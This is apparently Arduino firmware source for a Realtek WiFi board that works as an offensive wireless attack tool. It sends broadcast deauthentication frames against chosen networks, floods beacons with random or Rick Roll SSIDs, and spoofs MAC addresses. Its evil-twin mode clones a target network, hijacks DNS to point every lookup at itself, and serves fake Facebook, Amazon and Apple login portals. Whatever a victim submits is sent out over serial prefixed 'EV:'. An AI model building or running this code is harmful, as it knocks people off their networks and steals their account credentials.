
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"
#include <Arduino_JSON.h>
#include <rtl8721d.h>
#include <sys_api.h>
#include <stdio.h>
#include "facebook.h"
#include "amazon.h"
#include "apple.h"
#include "default.h"
//DNS
#include <WiFiUdp.h>
#include <lwip/udp.h>
#include <lwip/tcp.h>
#include <lwip/netifapi.h>
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>
#include <wifi_Udp.h>
#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200

//DNS

#define DNS_HEADER_SIZE        12
#define DNS_SERVER_PORT        53

static struct udp_pcb *dns_server_pcb;

struct dns_hdr {
  PACK_STRUCT_FIELD(u16_t id);
  PACK_STRUCT_FIELD(u8_t flags1);
  PACK_STRUCT_FIELD(u8_t flags2);
  PACK_STRUCT_FIELD(u16_t numquestions);
  PACK_STRUCT_FIELD(u16_t numanswers);
  PACK_STRUCT_FIELD(u16_t numauthrr);
  PACK_STRUCT_FIELD(u16_t numextrarr);
} PACK_STRUCT_STRUCT;

struct DNSHeader {
  uint16_t ID;  // identification number
  union {
    struct {
      uint16_t RD     : 1;  // recursion desired
      uint16_t TC     : 1;  // truncated message
      uint16_t AA     : 1;  // authoritative answer
      uint16_t OPCode : 4;  // message_type
      uint16_t QR     : 1;  // query/response flag
      uint16_t RCode  : 4;  // response code
      uint16_t Z      : 3;  // its z! reserved
      uint16_t RA     : 1;  // recursion available
    };
    uint16_t Flags;
  };
  uint16_t QDCount;  // number of question entries
  uint16_t ANCount;  // number of ANswer entries
  uint16_t NSCount;  // number of authority entries
  uint16_t ARCount;  // number of Additional Resource entries
};

struct DNSQuestion {
  const uint8_t *QName;
  uint16_t QNameLength;
  uint16_t QType;
  uint16_t QClass;
};

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple
};


typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};


std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis, wifis_temp;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll;
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
#define FRAMES_PER_DEAUTH 5
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

void printCurrentNet() {
    // print the SSID of the AP:
    Serial.print("SSID: ");
    Serial.println(WiFi.SSID());

    // print the MAC address of AP:
    byte bssid[6];
    WiFi.BSSID(bssid);
    Serial.print("BSSID: ");
    Serial.print(bssid[0], HEX);
    Serial.print(":");
    Serial.print(bssid[1], HEX);
    Serial.print(":");
    Serial.print(bssid[2], HEX);
    Serial.print(":");
    Serial.print(bssid[3], HEX);
    Serial.print(":");
    Serial.print(bssid[4], HEX);
    Serial.print(":");
    Serial.println(bssid[5], HEX);

    // print the encryption type:
    byte encryption = WiFi.encryptionType();
    Serial.print("Encryption Type:");
    Serial.println(encryption, HEX);
    Serial.println();
}


//DNS
bool apActive = false;
uint8_t dhcpServer[4]={192,168,1,1};
bool requestIncludesOnlyOneQuestion(DNSHeader &dnsHeader) {
  return ntohs(dnsHeader.QDCount) == 1 && dnsHeader.ANCount == 0 && dnsHeader.NSCount == 0 && dnsHeader.ARCount == 0;
}
static void dnss_receive_udp_packet_handler(
  
        void *arg,
        struct udp_pcb *udp_pcb,
        struct pbuf *udp_packet_buffer,
        struct ip_addr *sender_addr,
        uint16_t sender_port) 
{     
        /* To avoid gcc warnings */
        ( void ) arg;
 String _domainName;
        DNSHeader dnsHeader;
        DNSQuestion dnsQuestion;
        int sizeUrl;
        memcpy(&dnsHeader, udp_packet_buffer->payload, DNS_HEADER_SIZE);
          if (requestIncludesOnlyOneQuestion(dnsHeader)) {
            /*
              // The QName has a variable length, maximum 255 bytes and is comprised of multiple labels.
              // Each label contains a byte to describe its length and the label itself. The list of
              // labels terminates with a zero-valued byte. In "github.com", we have two labels "github" & "com"
        */
            const char *enoflbls = strchr(reinterpret_cast<const char *>(udp_packet_buffer->payload) + DNS_HEADER_SIZE, 0);  // find end_of_label marker
            ++enoflbls;                                                                                      // advance after null terminator
            dnsQuestion.QName = (uint8_t *)udp_packet_buffer->payload + DNS_HEADER_SIZE;                                                // we can reference labels from the request
            dnsQuestion.QNameLength = enoflbls - (char *)udp_packet_buffer->payload - DNS_HEADER_SIZE;
            sizeUrl = static_cast<int>(dnsQuestion.QNameLength);
            
            /*
                check if we aint going out of pkt bounds
                proper dns req should have label terminator at least 4 bytes before end of packet
              */
            if (dnsQuestion.QNameLength > udp_packet_buffer->len - DNS_HEADER_SIZE - sizeof(dnsQuestion.QType) - sizeof(dnsQuestion.QClass)) {
              return;  // malformed packet
            }         
                
                struct dns_hdr *hdr = (struct dns_hdr*) udp_packet_buffer->payload;
                
                struct pbuf *p = pbuf_alloc(PBUF_TRANSPORT, sizeof(struct dns_hdr) + sizeUrl + 20, PBUF_RAM);

                if(p) {
                        struct dns_hdr *rsp_hdr = (struct dns_hdr*) p->payload;
                        rsp_hdr->id = hdr->id;
                        rsp_hdr->flags1 = 0x85;
                        rsp_hdr->flags2 = 0x80;
                        rsp_hdr->numquestions = PP_HTONS(1);
                        rsp_hdr->numanswers = PP_HTONS(1);
                        rsp_hdr->numauthrr = PP_HTONS(0);
                        rsp_hdr->numextrarr = PP_HTONS(0);
                        memcpy((uint8_t *) rsp_hdr + sizeof(struct dns_hdr), dnsQuestion.QName, sizeUrl);
                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl) = PP_HTONS(1);
                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 2) = PP_HTONS(1);
                        *((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 4) = 0xc0;
                        *((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 5) = 0x0c;
                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 6) = PP_HTONS(1);
                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 8) = PP_HTONS(1);
                        *(uint32_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 10) = PP_HTONL(0);
                        *(uint16_t *)((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 14) = PP_HTONS(4);
                        memcpy((uint8_t *) rsp_hdr + sizeof(struct dns_hdr) + sizeUrl + 16, (void*)dhcpServer, 4);

                        udp_sendto(udp_pcb, p, sender_addr, sender_port);
                        pbuf_free(p);
                }
          }
        //}       
        else {
                struct dns_hdr *dns_rsp;
                dns_rsp = (struct dns_hdr*) udp_packet_buffer->payload;

                dns_rsp->flags1 |= 0x80; // 0x80 : Response;
                dns_rsp->flags2 = 0x05;  //0x05 : Reply code (Query Refused)

                udp_sendto(udp_pcb, udp_packet_buffer, sender_addr, sender_port);
        }

        /* free the UDP connection, so we can accept new clients */
        udp_disconnect(udp_pcb);

        /* Free the packet buffer */
        pbuf_free(udp_packet_buffer);
}

int status = WL_IDLE_STATUS;   

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.security = record->security;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
WiFiServer server(80);
bool serveBegined =false;
void createAP(char* ssid, char* channel){

  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
      delay(1000);
  }
  //Buscamos el puerto udp de las dns para matarloo
  struct udp_pcb *pcb;
  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
    
    if(pcb->local_port==DNS_SERVER_PORT){
      DEBUG_SER_PRINT("unbindg\n");
      udp_remove(pcb);
    }
  }
  delay(1000);

  //Creamos un nuevo servicio de dns
  dns_server_pcb = udp_new();
  DEBUG_SER_PRINT("binding dns\n");
  udp_bind(dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
  udp_recv(dns_server_pcb, (udp_recv_fn)dnss_receive_udp_packet_handler, NULL);
  DEBUG_SER_PRINT("binded dns\n");
  if(!serveBegined){
    
    server.begin();
    serveBegined=true;
  }
  apActive = true;
}

void createAP(char* ssid, char* channel, char* password){

  DEBUG_SER_PRINT("CREATING AP");
  DEBUG_SER_PRINT(ssid);
  DEBUG_SER_PRINT(channel);
  while (status != WL_CONNECTED) {
    DEBUG_SER_PRINT("CREATING AP 2");
      status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
      delay(1000);
  }
  //Buscamos el puerto udp de las dns para matarloo
  struct udp_pcb *pcb;
  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
    
    if(pcb->local_port==DNS_SERVER_PORT){
      DEBUG_SER_PRINT("unbindg\n");
      udp_remove(pcb);
    }
  }
  delay(1000);

  //Creamos un nuevo servicio de dns
  dns_server_pcb = udp_new();
  DEBUG_SER_PRINT("binding dns\n");
  udp_bind(dns_server_pcb, IP4_ADDR_ANY, DNS_SERVER_PORT);
  udp_recv(dns_server_pcb, (udp_recv_fn)dnss_receive_udp_packet_handler, NULL);
  DEBUG_SER_PRINT("binded dns\n");
  if(!serveBegined){
    
    server.begin();
    serveBegined=true;
  }
  apActive = true;
}

void destroyAP(){
  //udp_remove(dns_server_pcb);
  
  struct udp_pcb *pcb;
  for (pcb = udp_pcbs; pcb != NULL; pcb = pcb->next) {
    //if(pcb->local_port==DNS_SERVER_PORT){
      udp_remove(pcb);
    //}
  }
  delay(500);
  WiFiClient client = server.available();
  while(client.connected()){
    DEBUG_SER_PRINT("PArando cliente");
    DEBUG_SER_PRINT(client);
    client.flush();
    client.stop();
    client = server.available();
  }
  apActive=false;
  delay(500);
  wifi_off();
  delay(500);
  WiFiDrv::wifiDriverInit();
  wifi_on(RTW_MODE_STA_AP);
  status = WL_IDLE_STATUS;   
  delay(500);
  WiFi.enableConcurrent();

  WiFi.status();
  int channel;
  wifi_get_channel(&channel);



}


String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
  const char *webPage;
  switch(portalType){
    case Default:
      webPage = default_web(ssid);
      break;
    case Facebook:
      webPage = facebook;
      break;
    case Amazon:
      webPage = amazon;
      break;
    case Apple:
      webPage = apple;
      break;
    default:
      webPage = default_web(ssid);
  }

  String response = makeResponse(200, "text/html");
  client.write(response.c_str());
  size_t len = strlen(webPage);

  size_t chunkSize = 10000;  
  for (size_t i = 0; i < len; i += chunkSize) {
        size_t sendSize = MIN(chunkSize, len - i); 

        client.write((const uint8_t *)(webPage + i), sendSize);
        delay(10);  
  }
  delay(10);
  //client.flush();
}

int scanNetworks(int miliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
  scan_results.clear();
  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    digitalWrite(LED_B,false);
    for (int i =0;i<miliseconds/100;i++){
      digitalWrite(LED_G, !digitalRead(LED_G));
      delay(100);

    }
    digitalWrite(LED_B,true);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  digitalWrite(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;
void loop() {
  while (Serial1.available()) {
    delay(3);  //delay to allow buffer to fill 
    if (Serial1.available() >0) {
      char c = Serial1.read();  //gets one byte from serial buffer
      readString += c; //makes the string readString
    } 
  }
  if(readString.length()>0){
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis.clear();
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      while (scanNetworks(5000)){
        delay(1000);
      }
      Serial1.print("SCAN:OK\n");
      Serial.print("SCAN:OK\n");
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      
      secured = false;
      strcpy(wpa_pass,"");
      if(readString.length()>5 && !apActive){
        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
        if(numStation < scan_results.size()){
          wifis_temp.clear();
          unsigned int num_st_tmp;
          
          for(unsigned int i=0; i<deauth_wifis.size(); i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation){
              wifis_temp.push_back(num_st_tmp);
            }
          }
          deauth_wifis.clear();
          for(unsigned int i=0; i<wifis_temp.size(); i++){
            num_st_tmp=wifis_temp[i];
            deauth_wifis.push_back(num_st_tmp);
          }
        }
      }else{
        destroyAP();
        deauth_wifis.clear();
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      digitalWrite(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,7)=="APSTART"){
      char ssid[33];  // o el tamaño que necesites
      
      String ap_ssid = readString.substring(8,readString.length()-1);
      ap_ssid.toCharArray(ssid, 33);
      if(secured){
        createAP(ssid, ap_channel,wpa_pass);
      }else{
        createAP(ssid,ap_channel);
      }
      DEBUG_SER_PRINT("Starting BSSID "+ap_ssid+"\n");
        if(!serveBegined){
          server.begin();
          serveBegined=true;
        }
        apActive = true;

    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,6)=="PORTAL"){
      portal = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
    readString.substring(8,readString.length()-1).toCharArray(ap_channel,4);


    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      if(mac.length()==17){
        useCustomMac=true;
        
        char macStr[18]; 
        mac.toCharArray(macStr, sizeof(macStr)); 

        char *token = strtok(macStr, ":");
        int i = 0;

        while (token != NULL && i < 6) {
            customMac[i] = strtoul(token, NULL, 16);
            token = strtok(NULL, ":");
            i++;
        }
        


        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
      unsigned int numStation;
      if(readString.substring(0,4)=="EVIL"){
        numStation = readString.substring(5,readString.length()-1).toInt();
      }else{
        numStation = readString.substring(7,readString.length()-1).toInt();
      }
      if(numStation < scan_results.size()&&numStation >=0){
        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
        deauth_wifis.push_back(numStation);
        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
        if(readString.substring(0,4)=="EVIL"){
          int str_len = scan_results[numStation].ssid.length() + 1; 

          // Prepare the character array (the buffer) 
          char char_array[str_len];

          // Copy it over 
          scan_results[numStation].ssid.toCharArray(char_array, str_len);
          char buffer[4];  // Suficiente para "123\0"
          itoa(scan_results[numStation].channel, buffer, 10);
          if(str_len>1)
            createAP(char_array, buffer);
          else
            Serial1.print("ERROR: BAD SSID, please try to rescan again");
        }
      

      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }
      

    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,4)=="LIST"){
      
      for (uint i = 0; i < scan_results.size(); i++) {
        Serial.print("AP:"+String(i)+"|");
        Serial.print(scan_results[i].ssid + "|");
        Serial1.print("AP:"+String(i)+"|");
        Serial1.print(scan_results[i].ssid + "|");
        for (int j = 0; j < 6; j++) {
          if (j > 0){
             Serial.print(":");
             Serial1.print(":");
          }
          Serial.print(scan_results[i].bssid[j], HEX);
          Serial1.print(scan_results[i].bssid[j], HEX);
          
        }
        Serial.print("|" + String(scan_results[i].channel) + "|");
        Serial.print(String(scan_results[i].security) + "|");
        Serial.print(String(scan_results[i].rssi) + "\n");
        Serial1.print("|" + String(scan_results[i].channel) + "|");
        Serial1.print(String(scan_results[i].security) + "|");
        Serial1.print(String(scan_results[i].rssi) + "\n");
      }
      
    }
    readString="";

  }
  
  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    delay(50);
  }

  if (randomSSID){
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
  if (rickroll){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v; v < 8; v++){
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      } 
    
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    for(int x=0; x<5; x++){
      DEBUG_SER_PRINT("START "+ssid);
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }

  }
  
  if(apActive){
    WiFiClient client = server.available();
    
    
  
    String request;
    if (client) {
        // an http request ends with a blank line


        while (client.connected()) {          
              if (client.available()) {
                while (client.available()){
                char character = (char)client.read();
                request += character;
                 if(character == '\n'){
                  while (client.available())client.read();
                  break;
                 }
                 delay(1);
                }
                struct tcp_pcb *tcp;
                for(tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next){
                  if(tcp->local_port==80)tcp->local_port=localPortNew++;
                  tcp_close(tcp);
                }

              String path = parseRequest(request);

              //if (path == "/") {
	      
                if(deauth_wifis.size()!=0)
                  handleRequest(client,(enum portals)portal,scan_results[deauth_wifis[0]].ssid);              
                else
                  handleRequest(client,(enum portals)portal,"router");
              if(path.indexOf('?')&&(path.indexOf('=')>path.indexOf('?'))){
                  String datos = path.substring(path.indexOf('?')+1);
                  if(datos.length()>0){
                    Serial1.print("EV:");
                    Serial1.println(datos);
                  }
              }
              delay(100);
              break;
                
            }

        }
        client.stop(); // remove this line since destructor will be called automatically
    }
  }
  
}